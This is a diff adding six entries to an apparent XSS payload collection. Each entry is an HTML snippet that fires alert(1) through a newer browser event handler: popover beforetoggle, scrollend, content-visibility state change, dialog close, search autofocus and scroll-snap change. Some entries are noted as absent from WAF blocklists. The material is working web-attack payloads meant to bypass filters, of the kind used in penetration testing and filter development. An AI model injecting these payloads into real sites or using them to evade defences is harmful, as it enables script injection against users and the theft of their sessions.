@@ -126,3 +126,69 @@ Form with onsubmit event handler
 ```html
 <form onsubmit=alert(1)><input type=submit></form>
 ```
+
+### Popover BeforeToggle
+
+Popover API onbeforetoggle — works on hidden inputs (2024+)
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<button popovertarget=x>Click</button><xss popover id=x onbeforetoggle=alert(1)>
+```
+
+### ScrollEnd Event
+
+onscrollend fires when scroll completes — not in WAF blocklists
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<div onscrollend=alert(1) style="overflow:auto;height:50px"><br><br><br><br></div>
+```
+
+### Content Visibility
+
+content-visibility CSS triggers auto state change event
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<div oncontentvisibilityautostatechange=alert(1) style="display:block;content-visibility:auto"></div>
+```
+
+### Dialog OnClose
+
+Dialog element with onclose event handler
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<dialog open onclose=alert(1)><form method=dialog><button>X</button></form></dialog>
+```
+
+### Search Element AutoFocus
+
+New HTML search element with autofocus (2023+)
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<search onfocus=alert(1) autofocus tabindex=0>test</search>
+```
+
+### Scroll Snap Change
+
+CSS Scroll Snap event — Chrome 129+, brand new
+
+- **Contexts**: html
+- **Severity**: high
+
+```html
+<address onscrollsnapchange=alert(1) style="overflow-y:hidden;scroll-snap-type:x"><div style="scroll-snap-align:center">1337</div></address>
+```
